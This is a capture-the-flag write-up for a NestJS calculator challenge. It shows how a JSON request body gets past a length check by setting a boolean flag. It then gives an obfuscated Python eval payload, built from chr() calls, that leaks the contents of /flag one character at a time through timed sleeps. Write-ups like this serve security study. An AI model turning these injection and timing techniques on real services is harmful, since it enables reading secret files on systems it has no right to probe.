Calcalcalc
=====================

## Challenge

It's an unbreakable and reliable calculator... I think.

## Writeup

### Part 1

Read ``calculate.model.ts``, we know all user input will be validated before the controller gets.

```typescript
export default class CalculateModel {

  @IsNotEmpty()
  @ExpressionValidator(15, {
    message: 'Invalid input',
  })
  public readonly expression: string;

  @IsBoolean()
  public readonly isVip: boolean = false;
}

```

From ``ExpressionValidator``, we will know expression.length can be more than 15 bytes when ``isVip === true``, so the first task is to let ``isVip = true``.

Read the source code of ``class-validator``:
https://github.com/typestack/class-validator/blob/58a33e02fb5e77dde19ba5ca8de2197c9bc127e9/src/validation/Validator.ts#L323
```typescript
return value instanceof Boolean || typeof value === "boolean";
```

Sadly it's JavaScript runtime type. Nestjs will not auto convert ``'true'`` to ``true``(Nestjs is **NOT** Spring), so append ``isVip=true`` after post data is useless. However,
Nestjs + expressjs support ``json`` and ``urlencoded`` as its body by default.
https://github.com/nestjs/nest/blob/205d73721402fb508ce63d7f71bc2a5584a2f4b6/packages/platform-express/adapters/express-adapter.ts#L125
```typescript
    const parserMiddleware = {
      jsonParser: bodyParser.json(),
      urlencodedParser: bodyParser.urlencoded({ extended: true }),
    };
```

Just bypass it:
```http
Content-Type: application/json

{"expression":"MORE_THAN_15_BYTES_STRING", "isVip": true}
```

### Part 2

No intended solution... So this challenge will be reused XD

Unintended solution is timing attack:

```python
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(116)+chr(105)+chr(109)+chr(101)+chr(39)+chr(41)+chr(46)+chr(115)+chr(108)+chr(101)+chr(101)+chr(112)+chr(40)+chr(51)+chr(41)+chr(32)+chr(105)+chr(102)+chr(32)+chr(111)+chr(114)+chr(100)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(91)+chr(51)+chr(93)+chr(41)+chr(32)+chr(62)+chr(32)+chr(54)+chr(55)+chr(32)+chr(101)+chr(108)+chr(115)+chr(101)+chr(32)+chr(78)+chr(111)+chr(110)+chr(101))
```

means

```python
__import__('time').sleep(3) if ord(open('/flag').read()[3]) > 67 else None
```